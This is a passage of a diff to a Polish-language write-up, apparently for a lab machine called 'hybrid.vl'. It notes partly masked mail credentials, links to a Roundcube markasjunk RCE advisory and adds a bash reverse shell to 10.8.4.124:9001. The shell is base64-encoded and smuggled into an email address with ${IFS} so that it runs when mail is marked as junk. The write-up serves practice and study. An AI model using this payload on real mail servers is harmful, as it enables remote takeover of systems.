@@ -240,6 +240,41 @@ admin@hybrid.vl:{plain}Du<coś tam. Zrób leniu>21
 peter.turner@hybrid.vl:{plain}P<coś tam. Zrób leniu>l!
 ```
 
+![{00951F59-0D33-4BB1-AB09-85A0E7765859}](https://github.com/user-attachments/assets/df640b81-f75e-4004-913e-fa22eecf7b17)
+
+jako admin
+
+![{EE0461A6-9F0F-403C-A120-0E32C46DFED8}](https://github.com/user-attachments/assets/3931c5f3-3727-458a-83b4-dd9776ab3393)
+
+
+jako peter
+
+![{4CD72901-5B2B-4D1C-8A4D-5A14319ED191}](https://github.com/user-attachments/assets/966d5489-d493-4eae-b19c-21c8b56a285d)
+
+w sumie.. nic więcej
+
+`https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/`
+
+![{F1C8EBA2-D11C-468D-9E59-7CC967B9B99D}](https://github.com/user-attachments/assets/6f1aeb45-6f7c-4bcd-b1e4-61f4fb2f38ad)
+
+```
+echo "bash -c '/bin/bash -i >& /dev/tcp/10.8.4.124/9001 0>&1'" | base64
+```
+
+```
+&echo${IFS}YmFzaCAtYyAnL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguNC4xMjQvOTAwMSAwPiYxJwo=|base64${IFS}-d|bash&@hybrid.vl
+```
+
+jakikolwiek mail do `junk`
+
+![{EFD7636F-8158-463A-948D-9EA976623E52}](https://github.com/user-attachments/assets/fc94d885-2233-42be-8b52-07f93f4df703)
+
+![{020A3500-15E1-4C94-9960-ECC6847E4694}](https://github.com/user-attachments/assets/14d9a9db-a4aa-4166-91e8-430cd5db10cd)
+
+![{1DCB7A0E-F911-4F61-995D-9868AEEDC120}](https://github.com/user-attachments/assets/04ddb1eb-ede5-48c5-83d8-8ba2e90e0053)
+
+
+
 
 
 
